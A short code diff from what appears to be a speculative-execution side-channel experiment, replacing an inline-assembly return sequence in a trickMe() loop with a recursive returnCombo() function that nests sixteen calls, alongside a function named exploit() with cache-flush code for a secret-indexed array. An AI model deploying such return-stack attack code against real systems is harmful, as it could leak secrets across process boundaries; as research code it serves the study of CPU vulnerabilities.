@@ -36,31 +36,42 @@ void exploit() {
 	// clflush((void*)(&array[secret*offset]));
 }
 
+void returnCombo(unsigned int & level){
+	if(level>0) returnCombo(--level);
+	else{
+		for(int i=0; i<5; i++) sched_yield();
+		return;
+	}
+	return;
+}
+
 void trickMe() {
 	// while(1) {
 
 	while(1) {
 		// sched_yield();
 		// exploit();
-		asm(
-			retAsm(1)
-			retAsm(2)
-			retAsm(3)
-			retAsm(4)
-			retAsm(5)
-			retAsm(6)
-			retAsm(7)
-			retAsm(8)
-			retAsm(9)
-			retAsm(10)
-			retAsm(11)
-			retAsm(12)
-			retAsm(13)
-			retAsm(14)
-			retAsm(15)
-			retAsm(16)
-			: "=r" (tmp)
-		);
+		// asm(
+		// 	retAsm(1)
+		// 	retAsm(2)
+		// 	retAsm(3)
+		// 	retAsm(4)
+		// 	retAsm(5)
+		// 	retAsm(6)
+		// 	retAsm(7)
+		// 	retAsm(8)
+		// 	retAsm(9)
+		// 	retAsm(10)
+		// 	retAsm(11)
+		// 	retAsm(12)
+		// 	retAsm(13)
+		// 	retAsm(14)
+		// 	retAsm(15)
+		// 	retAsm(16)
+		// 	: "=r" (tmp)
+		// );
+		unsigned int level = 16;
+		returnCombo(level);
 	}
 }
 
